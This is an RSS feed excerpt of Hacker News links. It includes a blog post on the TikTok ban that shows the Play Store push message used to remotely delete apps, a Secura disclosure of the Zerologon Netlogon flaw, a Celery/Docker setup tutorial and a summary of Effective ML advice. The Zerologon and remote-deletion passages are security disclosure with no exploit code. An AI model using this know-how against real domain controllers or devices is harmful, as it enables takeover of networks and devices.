  <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/pocketbandit.png">
    <img src="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/pocketbandit.png">
  </a>
  
  <figcaption>Pocket Bandit: pretty (, colorful,) boring</figcaption>
  
</figure><p>
                             
                             
All you could do was to bet one to three coins, then pull the lever and watch the reels spin. You started with a fixed amount of credit and the laws of probability dictated that you’d eventually go bankrupt. Once that happened, you could simply restarted the “game” and had a full purse again. No <em>wait x hours or pay $$$ to continue playing</em> bullshit. No way of winning anything either. In other words: the most boring one-armed bandit ever. Not even suitable for detoxing a gambling addict. I had somehow managed to put in all the mechanics of a classical slot machine except the one (winning/loosing) that was responsible for producing the excitement.</p>

<p>Well, there’s no rule that states, you can’t publish rubbish on Google Play. Much to my surprise though, there is a rule that says, you can’t publish gambling apps in some Arab countries without governmental approval. So, one fateful morning, I received a mail from Google telling me that my app had been pulled from Play in those countries. I was pissed. Not because the world needed my app. Not because some Arabs were now deprived of the most dull entertainment, only I could provide. I was pissed because someone had obviously only spent the time of looking at the screenshots to determine that this was a gambling app, but hadn’t bothered to reason how you were suppose to spend (real) money in an app that doesn’t even request network permission. It felt unjustified. Like a downvote driven in with the banhammer. Someone with the attention span of a puppy had the power of Thor.</p>

<p>There was no point in appealing. After all, the game was crap, but the incident was a nice reminder on how fragile businesses, build on apps are. Somewhere, someone with too little time to be thorough can simply nuke them without prior warning. Needless to say, that in time, the same  kind of sloppiness resulted in more of my apps being pulled …</p>

<p>So, what’s the take away from my story?</p>

<p>Geo fencing has always been a core feature of Play and Google never really went out of its way to stand up for developers. Sure, my apps are small fries compared to behemoths like TikTok, but then again, they aren’t direct competitors to youtube either. Let’s keep that in mind in case anyone has high hopes for Google putting up a fight.</p>

<h2 id="what-about-sideloading">What about sideloading?</h2>

<p>Who needs Play anyway? Android is not IOS, we can simply download the APK off the web and install it ourselves, right? Eh well, no. It’s not that simple. Bytedance swallowed Google’s Cool Aid and switched to App Bundles/Dynamic Delivery in order to reduce the size of their app. So instead of a single, one size fits all APK, you get a bunch of individual files. In case of TikTok v17.6.3 and depending on your device, the list might look like this:</p>

<ul>
<li>com.zhiliaoapp.musically-2021706030.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.armeabi_v7a.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.en.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.xhdpi.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_creationtool_so.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_creationtool_so.config.armeabi_v7a.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_fusing.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_photomovie.apk</li>
</ul>

<p>Split APKs cannot be sideloaded (easily). On plain Android, there’s simply no user interface for telling the packagemanager that you want it to install an app from several connected files (<a href="https://raccoon.onyxbits.de/blog/merge-split-apk/">after all, making sideloading difficult was/is the whole idea behind App Bundles</a>). You need extra tools (e.g. ADB) for that. But let’s be brutally honest here, if you are in the target audience of TikTok, then you are probably missing a brain cell or two (out of a total of two) and won’t be able to use them.</p>

<div>
  
  <p><span>Fun fact</span>
  
  
App Bundles have a build in security flaw. Traditional APKs cannot be modified by the Playstore. App Bundles can. For rogue government agencies, this provides the option of pushing hacked app updates to </p><u>selected</u><p> individuals. For that reason, <b>no</b> app in the "communications" category should ever use App Bundles as a distribution format. Imagine that! Coincidentally, Trump was actually right when calling TikTok a security issue. Cheers ByteDance!

</p></div>
                             
                             

<p>So, why doesn’t ByteDance simply host a traditional APK on the TikTok website then?</p>

<p>Two reasons actually</p>

<ol>
<li>Self hosting your app means, people will download the self hosted version (duh!), even if they could get it from the Playstore. As a result, the Playstore version sees less downloads, less reviews and less ratings which may eventually lead to it spiraling down in the rankings (ever wondered why all youtubers end their videos with the magic mantra “like and subscribe, hit the bell and give me a thumbs up”? Same mechanic there). This, by the way was the leverage, Google used to monopolize the app store market on Android: you are free to host elsewhere, but if your competitors solely host with us, they will eventually outrank you.</li>
<li>ByteDance not only drank the Google Cool aid, but also coughed it up and swallowed it again. Part of their revenue is in-app purchases. Those don’t work with sideloaded APKs. They could, of course, implement their own <abbr title="In App Purchase">IAP</abbr>, but that’s something <a href="https://raccoon.onyxbits.de/blog/2020081401/">Epic tried with Fortnite</a> recently…</li>
</ol>

<h2 id="removing-existing-tiktok-installations-from-devices">Removing existing TikTok installations from devices</h2>

<p>Buckle up, this may come as a surprise or as a confirmation of your fears!</p>

<p>Did you ever notice the big green “install” button on the Google Play website? With it, you can conveniently browse the store on your PC and send apps to your phone for installation.</p>

<figure>
  <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/googleplay-tiktok.png">
    <img src="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/googleplay-tiktok.png">
  </a>
  
  <figcaption>Screencap: The install button on the Play website is sort off a remnant from the old days when 320x480 screens where the norm and you'd rather browse the androidmarket (as it was called back then) on your PC.</figcaption>
  
</figure>
                             
                             

<p>This is done via “Push messages”. Which is just a modern way of saying that your phone wakes up every couple of minutes in order to waste battery and bandwidth on checking if there are any new ads you should see. It also checks if there are any app updates or pending installs (from the green button) while it is at it, just so you have a reason not to disable the <del>spy</del> playstore app when you don’t need it. The relevant <a href="https://developers.google.com/protocol-buffers/">message structure</a> looks like this:</p>

<div><pre><code data-lang="protobuf"><span>message</span> <span>Notification</span> {<span>
</span><span></span>  <span>optional</span> <span>int32</span> notificationType <span>=</span> <span>1</span>;<span>
</span><span></span>  <span>optional</span> <span>int64</span> timestamp <span>=</span> <span>3</span>;<span>
</span><span></span>  <span>optional</span> Docid docid <span>=</span> <span>4</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> docTitle <span>=</span> <span>5</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> userEmail <span>=</span> <span>6</span>;<span>
</span><span></span>  <span>optional</span> AndroidAppNotificationData appData <span>=</span> <span>7</span>;<span>
</span><span></span>  <span>optional</span> AndroidAppDeliveryData appDeliveryData <span>=</span> <span>8</span>;<span>
</span><span></span>  <span>optional</span> PurchaseRemovalData purchaseRemovalData <span>=</span> <span>9</span>;<span>
</span><span></span>  <span>optional</span> UserNotificationData userNotificationData <span>=</span> <span>10</span>;<span>
</span><span></span>  <span>//optional InAppNotificationData inAppNotificationData = 11;
</span><span></span>  <span>//optional PurchaseDeclinedData purchaseDeclinedData = 12;
</span><span></span>  <span>optional</span> <span>string</span> notificationId <span>=</span> <span>13</span>;<span>
</span><span></span>  <span>optional</span> LibraryUpdate libraryUpdate <span>=</span> <span>14</span>;<span>
</span><span></span>  <span>optional</span> LibraryDirtyData libraryDirtyData <span>=</span> <span>15</span>;<span>
</span><span></span>}<span>
</span><span>
</span><span></span><span>message</span> <span>AndroidAppDeliveryData</span> {<span>
</span><span></span>  <span>optional</span> <span>int64</span> downloadSize <span>=</span> <span>1</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> signature <span>=</span> <span>2</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> downloadUrl <span>=</span> <span>3</span>;<span>
</span><span></span>  <span>repeated</span> AppFileMetadata additionalFile <span>=</span> <span>4</span>;<span>
</span><span></span>  <span>repeated</span> HttpCookie downloadAuthCookie <span>=</span> <span>5</span>;<span>
</span><span></span>  <span>optional</span> <span>bool</span> forwardLocked <span>=</span> <span>6</span>;<span>
</span><span></span>  <span>optional</span> <span>int64</span> refundTimeout <span>=</span> <span>7</span>;<span>
</span><span></span>  <span>optional</span> <span>bool</span> serverInitiated <span>=</span> <span>8</span>;<span>
</span><span></span>  <span>optional</span> <span>int64</span> postInstallRefundWindowMillis <span>=</span> <span>9</span>;<span>
</span><span></span>  <span>optional</span> <span>bool</span> immediateStartNeeded <span>=</span> <span>10</span>;<span>
</span><span></span>  <span>optional</span> AndroidAppPatchData patchData <span>=</span> <span>11</span>;<span>
</span><span></span>  <span>optional</span> EncryptionParams encryptionParams <span>=</span> <span>12</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> gzippedDownloadUrl <span>=</span> <span>13</span>;<span>
</span><span></span>  <span>optional</span> <span>int64</span> gzippedDownloadSize <span>=</span> <span>14</span>;<span>
</span><span></span>  <span>repeated</span> SplitDeliveryData splitDeliveryData <span>=</span> <span>15</span>;<span>
</span><span></span>  <span>optional</span> <span>int32</span> installLocation <span>=</span> <span>16</span>;<span>
</span><span></span>}<span>
</span><span>
</span><span></span><span>message</span> <span>PurchaseRemovalData</span> {<span>
</span><span></span>  <span>optional</span> <span>bool</span> malicious <span>=</span> <span>1</span>;<span>
</span><span></span>}</code></pre></div>

<p>A request to delete an app from a device looks like this:</p>

<div><pre><code data-lang="protobuf">notificationType<span>:</span> <span>2</span><span>
</span><span></span>docid {<span>
</span><span></span>  backendDocId<span>:</span> <span>"com.zhiliaoapp.musically"</span><span>
</span><span></span>}<span>
</span><span></span>purchaseRemovalData {<span>
</span><span></span>  malicious<span>:</span> <span>true</span><span>
</span><span></span>}</code></pre></div>

<p>Note that the malicious flag is purely cosmetic. The only thing Play has to send is the package name of the app and the notificationType 2. The app gets deleted, even if it wasn’t installed via Play.</p>

<h2 id="blocking-tiktok-in-the-usa">Blocking TikTok in the USA</h2>

<p>Let’s say you are an existing TikTok user and a US citizen. Let’s say, after reading the above, you disable the Playstore client, so Google can’t delete apps from your phone. What are they going to do then? Tell your ISP to firewall the TikTok servers (I heard, China has the tech for that. Maybe they’ll share…)? Well, curiously, there’s a much simpler solution. Did I already mention that ByteDance drank the Google Coolaid to the last drip? Let’s use an <a href="https://raccoon.onyxbits.de/">apk downloader</a> to request the <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/com_zhiliaoapp_musically.json">Google Playstore entry for the TikTok app</a>. Here’s an excerpt:</p>

<div><pre><code data-lang="json"><span>"dependency"</span><span>:</span> [{
          <span>"packageName"</span>: <span>"com.google.android.gms"</span>,
          <span>"minVersionCode"</span>: <span>12451000</span>,
          <span>"skipPermissions"</span>: <span>true</span>,
          <span>"deferredInstallAllowed"</span>: <span>false</span>
        }]</code></pre></div>

<p>The <code>com.google.android.gms</code>package is …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/">https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/</a></em></p>]]>
            </description>
            <link>https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530155</guid>
            <pubDate>Sat, 19 Sep 2020 20:35:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Stone Oakvalley's Amiga Music Collection (Soamc=) Collection]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530012">thread link</a>) | @bane
<br/>
September 19, 2020 | https://www.paula8364.com/0000_00_dashboard_index.php | <a href="https://web.archive.org/web/*/https://www.paula8364.com/0000_00_dashboard_index.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.paula8364.com/0000_00_dashboard_index.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530012</guid>
            <pubDate>Sat, 19 Sep 2020 20:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zerologon: Instantly become domain admin (CVE-2020-1472)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530005">thread link</a>) | @LeonM
<br/>
September 19, 2020 | https://www.secura.com/blog/zero-logon | <a href="https://web.archive.org/web/*/https://www.secura.com/blog/zero-logon">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span>Blog post 11 September 2020, by Tom Tervoort, Senior Security Specialist and Ralph Moonen, Technical Director at Secura</span></p>
<p><span><span><em></em></span></span><span><strong><span>Last month, Microsoft patched a very interesting vulnerability that would allow an attacker with a foothold on your internal network to essentially become Domain Admin with one click. All that is required is for a connection to the Domain Controller to be possible from the attacker’s viewpoint. </span></strong></span></p>
<p><span>Secura's security expert Tom Tervoort previously discovered <strong><span><a target="_blank" href="https://www.secura.com/blog-cve-2019-1424" rel="noopener noreferrer">a less severe Netlogon vulnerability last year that allowed workstations to be taken over</a></span></strong>, but the attacker required a Person-in-the-Middle (PitM) position for that to work. Now, he discovered this second, much more severe (CVSS score: 10.0) vulnerability in the protocol. By forging an authentication token for specific Netlogon functionality, he was able to call a function to set the computer password of the Domain Controller to a known value. After that, the attacker can use this new password to take control over the domain controller and steal credentials of a domain admin. </span></p>
<p><span>The vulnerability stems from a flaw in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This flaw allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf. </span></p>
<p><span>Secura urges everybody to install the patch on all their domain controllers as fast as possible. Please refer to Microsoft’s advisory. <strong>We published a test tool on Github</strong>, which you can download here:&nbsp;<strong><span><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></span></strong> that can tell you whether a domain controller is vulnerable or not.&nbsp;</span></p>
<p><span>If you are interested in the technical details behind this pretty unique vulnerability and how it was discovered,<span><strong> <a target="_blank" href="https://www.secura.com/pathtoimg.php?id=2055" rel="noopener noreferrer">download the whitepaper here</a></strong></span>.&nbsp;</span></p>
<p><span><strong>For more information about the CVE, <span><a href="mailto:info@secura.com">contact Secura&nbsp;at </a><a href="mailto:info@secura.com">info@secura.com</a><a href="mailto:info@secura.com">.</a></span></strong></span></p>
<p><span><a title="Zerologon whitepaper" target="_blank" href="https://www.secura.com/pathtoimg.php?id=2055" rel="noopener noreferrer"><span><strong><span><img alt="" src="https://www.secura.com/pathtoimg.php?id=2056&amp;image=zerologon_whitepaper.png" width="193" height="272"></span></strong></span></a></span></p>
<p><span>Read more about Zerologon: CVE-2020-1472&nbsp;in our&nbsp;<strong><span><a target="_blank" href="https://www.secura.com/pathtoimg.php?id=2055" rel="noopener noreferrer">whitepaper</a>.&nbsp;</span></strong></span><span>If you have any questions, please contact us at&nbsp;<span><strong><a href="mailto:info@secura.com">info@secura.com</a>.</strong></span></span></p>
<p><span><span><strong><a href="mailto:info@secura.com"><span></span>&nbsp;Contact us</a></strong></span></span></p>


</div></div>]]>
            </description>
            <link>https://www.secura.com/blog/zero-logon</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530005</guid>
            <pubDate>Sat, 19 Sep 2020 20:02:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python Web Assembly Playground]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529981">thread link</a>) | @lanecwagner
<br/>
September 19, 2020 | https://app.qvault.io/playground/python | <a href="https://web.archive.org/web/*/https://app.qvault.io/playground/python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://app.qvault.io/playground/python</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529981</guid>
            <pubDate>Sat, 19 Sep 2020 19:59:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Distributed Task Processing Using Celery]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529889">thread link</a>) | @bswamina
<br/>
September 19, 2020 | https://www.polarsparc.com/xhtml/Celery.html | <a href="https://web.archive.org/web/*/https://www.polarsparc.com/xhtml/Celery.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <br>
    
    
    <p>Distributed Task Processing using Celery</p>
    <br>
    
    <hr>
    
    <p>Overview</p>
    <div id="para-div">
      <p>Recently, two new crypto currencies have entered the market and are all the rage - the <span>BLU</span> coin
        and the <span>RED</span> coin. There are only three exchanges where these popular coins are being traded - the
        <span>CAT</span>, <span>DOG</span>, and <span>FOX</span> exchanges respectively.
        There is an API exposed, through which buyers can query the current best favorable rate provided by one of the 3 exchanges.
        Given the popularity of these coins, the API is being bombarded by the consumers. How can one handle this situation ? What if
        there is an easy way to distribute the processing, in an asynchronous way, on a single host (or multiple hosts) using message
        passing, and with an ability to retry automatically on failures ???</p>
      <p>Welcome <a href="https://docs.celeryproject.org/en/stable/" target="_blank"><span>Celery</span></a> - the
        distributed task processing framework for <span>Python</span> !!!</p>
    </div>
    <div id="para-div">
      <p><span>Celery</span> is a simple, flexible, and reliable distributed task queue processing framework for Python,
        with the following features:</p>
      <ul id="blue-sqr-ul">
        <li>
          <p>Distributed task processing is initiated through message passaging using a middleware broker such as the
            <a href="https://www.polarsparc.com/xhtml/RabbitMQ-1.html" target="_blank"><span>RabbitMQ</span></a></p>
        </li>
        <li>
          <p>Task processing is handled by worker(s) which are responsible for the execution of the task</p>
        </li>
        <li>
          <p>Results from a task processing can be stored in a backend store such as <a href="https://redis.io/" target="_blank">
            <span>Redis</span></a></p>
        </li>
        <li>
          <p>Task processing can be immediately triggered (real-time) or can be scheduled (batched)</p>
        </li>
        <li>
          <p>Failed tasks will be automatically retried on errors</p>
        </li>
        <li>
          <p>Complex pipeline of task(s) can be processed by distributing the task(s) across different host(s)</p>
        </li>
        <li>
          <p>Architecture is based on a pluggable component model</p>
        </li>
      </ul>
    </div>
    <div id="para-div">
      <p>The following illustration depicts the high-level architecture of the Celery task queue processing:</p>
      <div id="img-outer-div"> <p><img alt="Architecture" src="https://www.polarsparc.com/xhtml/images/celery-01.png"></p><p>Figure.1</p>
      </div>
    </div>
    
    <p>Before we proceed further the following are some of the terminology used in the context of Celery:</p>
    <table id="col2-table">
      <thead><tr>
        <th>Term</th>
        <th>Description</th>
      </tr>
      </thead>
      <tbody>
        <tr>
          <td><span>Task</span></td>
          <td>A job that needs to be dispatched for execution</td>
        </tr>
        <tr>
          <td><span>Broker</span></td>
          <td>The messaging middleware such as RabbitMQ</td>
        </tr>
        <tr>
          <td><span>Worker</span></td>
          <td>The entity that executes task(s)</td>
        </tr>
        <tr>
          <td><span>Backend</span></td>
          <td>The store where the worker(s) persist the result of an execution</td>
        </tr>
      </tbody>
    </table>
    
    <p>Now, we can explain the high-level flow using the architecture diagram from Figure.1 above. When client(s) (also referred
        to as <span>Producer</span>(s)) invoke a Python method (annotated with a special Celery task decorator), the
        decorated task sends a message (with the name of the method along with its arguments) to a designated task queue in the
        messaging Broker and returns an asynchronous result object to the caller. There are task Worker(s) waiting on the designated
        task queue (also referred to as <span>Consumer</span>(s)). When a message arrives on a queue, a task Worker
        executes the specified Python method with the method arguments (from the message) and sends the result (of the task execution)
        to the configured Backend store. The caller can check if the task execution has completed using the asynchronous result
        object. Once the task execution completes, the caller can get the result from the asynchronous result object, which in-turn
        fetches the result from the Backend store.</p>
    <p>Installation</p>
    <div id="para-div">
      <p>We can install, setup, and demonstrate Celery on a single host with VMs or on multiple host(s). For my setup, will leverage
        a 6-node cluster consisting of <span>5</span> <a href="https://www.polarsparc.com/xhtml/XU4-Cluster.html" target="_blank"><span>ODroid XU4</span></a>'s and a <a href="https://www.hardkernel.com/shop/odroid-c2/" target="_blank"><span>ODroid C2</span></a>. The following illustration shows the 6-node cluster:</p>
      <div id="img-outer-div"> <p><img alt="Cluster" src="https://www.polarsparc.com/xhtml/images/celery-02.png"></p><p>Figure.2</p>
      </div>
    </div>
    <br>
    <div id="para-div">
      <p>Ensure each of the nodes have the <a href="https://www.armbian.com/download/?tx_maker=hardkernel" target="_blank">
        <span>Armbian</span></a> OS installed. Next, launch 6 terminal windows and login to each of the nodes (assuming
        the user-id is <span>alice</span>). We will refer to these terminals as <span>my-xu4-1</span>
        thru <span>my-xu4-5</span> and <span>my-c2-1</span> respectively.</p>
      <p>We need to find the machine architecture for both the <span>ODroid XU4</span> and the <span>ODroid
        C2</span> SBCs. In the terminal my-xu4-1, execute the following command:</p>
    </div>
    <p>$ dpkg --print-architecture</p>
    <p>The following would be the typical output:</p>
    
    <p>Similarly, in the terminal my-c2-1, execute the above command.</p>
    <p>The following would be the typical output:</p>
    
    <p>In each of the 6 terminals, execute the following command:</p>
    <p>$ sudo apt-get remove docker docker-engine docker.io containerd runc</p>
    <p>The following would be the typical output:</p>
    <div id="out-div">
      <h4>Output.3</h4>
      <pre>Reading package lists... Done
Building dependency tree       
Reading state information... Done
E: Unable to locate package docker-engine</pre>
    </div>
    <p>In each of the 6 terminals, execute the following command:</p>
    <p>$ sudo apt-get update</p>
    <p>The following would be the typical output:</p>
    <div id="out-div">
      <h4>Output.4</h4>
      <pre>Hit:2 http://ports.ubuntu.com focal InRelease
Hit:3 http://ports.ubuntu.com focal-security InRelease
Hit:4 http://ports.ubuntu.com focal-updates InRelease
Hit:5 http://ports.ubuntu.com focal-backports InRelease
Hit:1 https://armbian.systemonachip.net/apt focal InRelease
Reading package lists... Done</pre>
    </div>
    <p>In each of the 6 terminals, execute the following command:</p>
    <p>$ sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</p>
    <p>The following would be the typical output:</p>
    <div id="out-div">
      <h4>Output.5</h4>
      <pre>Reading package lists... Done
Building dependency tree       
Reading state information... Done
ca-certificates is already the newest version (20190110ubuntu1.1).
curl is already the newest version (7.68.0-1ubuntu2.2).
software-properties-common is already the newest version (0.98.9.2).
apt-transport-https is already the newest version (2.0.2ubuntu0.1).
The following NEW packages will be installed:
  gnupg-agent
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 5,236 B of archives.
After this operation, 46.1 kB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://ports.ubuntu.com focal/universe arm64 gnupg-agent all 2.2.19-3ubuntu2 [5,236 B]
Fetched 5,236 B in 0s (18.1 kB/s)       
Selecting previously unselected package gnupg-agent.
(Reading database ... 84665 files and directories currently installed.)
Preparing to unpack .../gnupg-agent_2.2.19-3ubuntu2_all.deb ...
Unpacking gnupg-agent (2.2.19-3ubuntu2) ...
Setting up gnupg-agent (2.2.19-3ubuntu2) ...</pre>
    </div>
    <p>In each of the 6 terminals, execute the following command:</p>
    <p>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</p>
    <p>The following would be the typical output:</p>
    
    <p>In each of the 5 terminals my-xu4-1 thru my-xu4-5, execute the following command:</p>
    <p>$ sudo add-apt-repository "deb [arch=armhf] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</p>
    <p>The following would be the typical output:</p>
    <div id="out-div">
      <h4>Output.7</h4>
      <pre>Get:1 https://download.docker.com/linux/ubuntu focal InRelease [36.2 kB]
Hit:3 http://ports.ubuntu.com focal InRelease                              
Hit:4 http://ports.ubuntu.com focal-security InRelease     
Hit:5 http://ports.ubuntu.com focal-updates InRelease
Hit:6 http://ports.ubuntu.com focal-backports InRelease
Get:7 https://download.docker.com/linux/ubuntu focal/stable armhf Packages [2,743 B]
Hit:2 https://mirrors.netix.net/armbian/apt focal InRelease
Fetched 38.9 kB in 2s (17.8 kB/s)
Reading package lists... Done</pre>
    </div>
    <p>In the terminal my-c2-1, execute the following command:</p>
    <p>$ sudo add-apt-repository "deb [arch=arm64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</p>
    <p>The following would be the typical output:</p>
    <div id="out-div">
      <h4>Output.8</h4>
      <pre>Get:1 https://download.docker.com/linux/ubuntu focal InRelease [36.2 kB]
Hit:3 http://ports.ubuntu.com focal InRelease                              
Hit:4 http://ports.ubuntu.com focal-security InRelease     
Hit:5 http://ports.ubuntu.com focal-updates InRelease
Hit:6 http://ports.ubuntu.com focal-backports InRelease
Get:7 https://download.docker.com/linux/ubuntu focal/stable arm64 Packages [2,743 B]
Hit:2 https://mirrors.netix.net/armbian/apt focal InRelease
Fetched 38.9 kB in 2s (17.8 kB/s)
Reading package lists... Done</pre>
    </div>
    <p>In each of the 6 terminals, execute the following command:</p>
    <p>$ sudo apt-get update</p>
    <p>The following would be the typical output:</p>
    <div id="out-div">
      <h4>Output.9</h4>
      <pre>Hit:1 https://download.docker.com/linux/ubuntu focal InRelease
Hit:3 http://ports.ubuntu.com focal InRelease 
Hit:4 http://ports.ubuntu.com focal-security InRelease
Hit:5 http://ports.ubuntu.com focal-updates InRelease
Hit:6 http://ports.ubuntu.com focal-backports InRelease
Hit:2 https://imola.armbian.com/apt focal InRelease
Reading package lists... Done</pre>
    </div>
    <p>In each of the 5 terminals my-xu4-1 thru my-xu4-5, execute the following command:</p>
    <p>$ sudo apt-get install docker-ce docker-ce-cli containerd.io</p>
    <p>The following would be the typical output:</p>
    <div id="out-div">
      <h4>Output.10</h4>
      <pre>Reading package lists... Done
Building dependency tree       
Reading state information... Done
Recommended packages:
  cgroupfs-mount | cgroup-lite pigz apparmor
The following NEW packages will be installed:
  containerd.io docker-ce docker-ce-cli
0 upgraded, 3 newly installed, 0 to remove and 0 not upgraded.
Need to get 60.2 MB of archives.
After this operation, 303 MB of additional disk space will be used.
Get:1 https://download.docker.com/linux/ubuntu focal/stable armhf containerd.io armhf 1.2.13-2 [16.2 MB]
Get:2 https://download.docker.com/linux/ubuntu focal/stable armhf docker-ce-cli armhf 5:19.03.12~3-0~ubuntu-focal [28.8 MB]
Get:3 https://download.docker.com/linux/ubuntu focal/stable armhf docker-ce armhf 5:19.03.12~3-0~ubuntu-focal [15.2 MB]            
Fetched 60.2 MB in 8s (7,619 kB/s)                                                                                                 
Selecting previously unselected package containerd.io.
(Reading database ... 84669 files and directories currently installed.)
Preparing to unpack …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.polarsparc.com/xhtml/Celery.html">https://www.polarsparc.com/xhtml/Celery.html</a></em></p>]]>
            </description>
            <link>https://www.polarsparc.com/xhtml/Celery.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529889</guid>
            <pubDate>Sat, 19 Sep 2020 19:37:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Effective ML (and F#)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529774">thread link</a>) | @jasim
<br/>
September 19, 2020 | http://bugfree.dk/blog/2012/06/24/effective-ml-and-fsharp | <a href="https://web.archive.org/web/*/http://bugfree.dk/blog/2012/06/24/effective-ml-and-fsharp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
  <p>
    This is a summary of <a href="http://twitter.com/#!/yminsky">Yaron Minsky</a>'s nine pieces of advice from the <a href="http://vimeo.com/14313378">Effective ML</a> video. Since ML is a predecessor of F#, most of the advice applies to F# as well.
  </p>
  <p>
    <strong>1. Favor readers over writers (10:20)</strong>. There're systematic differences in opinion between those who spent their time reading code and those who spent it writing code. Whenever there's a difference in opinion between these two groups, the readers are always right and the writers are always wrong. The readers will always push in the direction of clarity and simplicity and the ability to change behavior easily. At least if you're building software that's going to last.
  </p>
  <p>
    <strong>2. Create uniform interfaces (12:15)</strong>. Always create an interface to your code to make it easier on the reader. When you build interfaces, you should have standards that apply uniformly across your code base to build solid expectations. Those who use your code should know what to provide and what to expect when interfacing with your codebase.
  </p>
  <p>
    <strong>3. Make illegal states unrepresentable (18:03)</strong>. Use the type system as a tool to enforce invariants on the code you write. Choose your data types such that states that are illegal don't show up as legal states in the program. Take this code representing various connection information as an example. It keeps track of relevant information in a fairly readable manner:
  </p>
  <pre>type connection_state =
  | Connecting
  | Connected
  | Disconnected

type connection_info = {
    state:             connection_state
    server:            IPAddress
    last_ping_time:    DateTime option
    last_ping_id:      int option
    session_id:        string option
    when_initiated:    DateTime option
    when_disconnected: DateTime option
}</pre>
  <p>On the surface these types look reasonable, but there're some tricky invariants that need to hold about the data. For instance, if you have a last_ping_time, you should probably also have a last_ping_id and vice versa. And the session_id and when_initiated probably only makes sense when you're connected. Similarly, when_disconnected only makes sense if you've been disconnected.</p>
  <p>The key is that there's nothing about the types that help you enforce all these invariants. A better approach would be to refactor the connection_info into a series of types where the invariants would be inherent in the types themselves rather than being implicit in the logic surrounding the types:</p>
  <pre>type connecting = { when_initiated: DateTime }
type connected = { last_ping: (DateTime * int) option
                   session_id: string }
type disconnected = { when_connected: DateTime }

type connection_state =
  | Connecting of connecting
  | Connected of connected
  | Disconnected of disconnected

type connection_info = {
    state: connection_state
    server: IPAddress
}</pre>
  <p>server remains in connection_info because it applies to any of the states. The other information have been grouped together with the state it related to. The different connection_states are no longer merely a simple enumerated type but each of the different tags have content. Note also how the last_ping is now both the last_ping_time and last_ping_id. Either both are present, and grouped together, or not.</p>
  <p>
    <strong>4. Code for exhaustiveness (28:33)</strong>. This one is closely related to making illegal states unrepresentable in that you should write your code aiming at exhaustiveness guarantees. For instance, when you have a match statement, the compiler will warn you if the match isn't exhaustive. The key benefit is as a refactoring tool because it guides changes in the code base. Don't use the match all because it means that if you expand on the discriminated union the compiler will not warn you.
  </p>
  <p>
    <strong>5. Open few modules (34:08)</strong>. When you open a module, it makes your code a bit shorter, and that's great for the guy who wrote the code, but not the guy reading it. Now you can no longer just look at the code and tell where the value came from. In F#, with Visual Studio integration and IntelliSense, this is less of a problem. But the key advice is to respect the cognitive limitation of the people reading the code. If you want people to remember something, make them remember only for a short period of time.
  </p>
  <p>
    <strong>6. Make common errors obvious (38:10)</strong>. Use exceptions for exceptional conditions is what people often tell you. But whether something is a common case depends on context. For instance, in one context it's an error if an element isn't in a list, whereas in others it's perfectly acceptable. For your API it may depend on the caller if a case is exceptional or not. To better support the caller, you could create two versions depending on how you want to communicate an error:
  </p>
  <pre>val hd : 'T list -&gt; 'T option
val hd_exn : 'T list -&gt; 'T</pre>
